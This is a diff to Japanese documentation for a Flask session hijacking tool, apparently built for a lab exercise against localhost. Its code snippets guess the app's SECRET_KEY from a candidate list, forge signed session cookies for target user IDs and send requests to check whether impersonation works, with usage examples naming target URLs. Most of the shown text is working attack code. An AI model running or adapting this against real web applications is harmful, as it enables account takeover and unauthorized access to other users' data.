@@ -79,16 +79,25 @@ python 001session_hijack.py -u http://localhost:5000 -i 1-5
 
 ## コード解説
 
-### 1. コマンドライン引数の解析（6-27行目）
+### 1. コマンドライン引数の解析（105-120行目）
 
 ```python
-parser = argparse.ArgumentParser(
-    description='WEBサーバーに対するセッションハイジャックツール',
-    formatter_class=argparse.RawDescriptionHelpFormatter,
-    epilog="""使用例: ..."""
-)
-parser.add_argument('-u', '--url', required=True, help='ターゲットURL（必須）')
-parser.add_argument('-i', dest='user_id', default='1', help='攻撃対象のユーザーID（デフォルト: 1）。範囲指定可（例: 1-2）')
+def main():
+    parser = argparse.ArgumentParser(
+        description='WEBサーバーに対するセッションハイジャックツール',
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+使用例:
+  python 001session_hijack.py -u http://localhost:5000
+  python 001session_hijack.py --url http://example.com:8080
+  python 001session_hijack.py -u http://localhost:5000 -i 2
+  python 001session_hijack.py -u http://localhost:5000 -i 1-2
+        """
+    )
+    
+    parser.add_argument('-u', '--url', required=True, help='ターゲットURL（必須）')
+    parser.add_argument('-i', dest='user_id', default='1', 
+                       help='攻撃対象のユーザーID（デフォルト: 1）。範囲指定可（例: 1-2）')
 ```
 
 `argparse`を使用してコマンドライン引数を解析します。`-u`（または`--url`）は必須で、`-i`でユーザーIDを指定できます。
@@ -115,15 +124,24 @@ def parse_user_ids(user_id_str):
 ```python
 def discover_secret_key(secret_keys, target_url, test_user_id):
     """SECRET_KEYを総当たりで特定"""
+    print("\n[*] 試行するSECRET_KEY候補:")
+    for i, key in enumerate(secret_keys, 1):
+        print(f"  {i}. {key}")
+    
     for secret_key in secret_keys:
+        print(f"\n[*] SECRET_KEYを試行: {secret_key}")
         serializer = test_secret_key(secret_key, target_url, test_user_id)
         if serializer:
+            print(f"  [OK] SECRET_KEY '{secret_key}' が正しいです！")
             return secret_key, serializer
-    # フォールバック
+        print(f"  [NG] SECRET_KEY '{secret_key}' では失敗")
+    
+    print(f"\n[!] 警告: すべてのSECRET_KEYで失敗しました")
+    print(f"[!] デフォルトのSECRET_KEY '{secret_keys[0]}' を使用します")
     return secret_keys[0], create_serializer(secret_keys[0])
 ```
 
-各SECRET_KEY候補に対して、`test_secret_key`関数で実際のHTTPリクエストを送信して検証します。成功した場合、そのSECRET_KEYとシリアライザーを返します。
+各SECRET_KEY候補に対して、`test_secret_key`関数で実際のHTTPリクエストを送信して検証します。成功した場合、そのSECRET_KEYとシリアライザーを返します。すべて失敗した場合は、デフォルトのSECRET_KEYを使用します。
 
 ### 4. セッションデータの偽造（25-27行目）
 
@@ -144,12 +162,15 @@ def create_serializer(secret_key):
     app.config['SECRET_KEY'] = secret_key
     return app.session_interface.get_signing_serializer(app)
 
-# 使用例
-serializer = create_serializer(secret_key)
-cookie = serializer.dumps(create_session_data(user_id))
+def test_secret_key(secret_key, target_url, test_user_id):
+    """SECRET_KEYをテストして有効性を確認"""
+    serializer = create_serializer(secret_key)
+    cookie = serializer.dumps(create_session_data(test_user_id))
+    response = make_request_with_cookie(cookie, target_url)
+    return serializer if is_attack_successful(response) else None
 ```
 
-Flaskの`SecureCookieSessionInterface`を使用して、セッションデータを署名付きのセッションクッキーにエンコードします。これにより、サーバーが検証可能な有効なセッションクッキーが生成されます。
+Flaskの`SecureCookieSessionInterface`を使用して、セッションデータを署名付きのセッションクッキーにエンコードします。`test_secret_key`関数では、生成したクッキーで実際にリクエストを送信し、成功判定を行います。
 
 ### 6. プロフィールページへのアクセス（40-44行目、83行目）
 
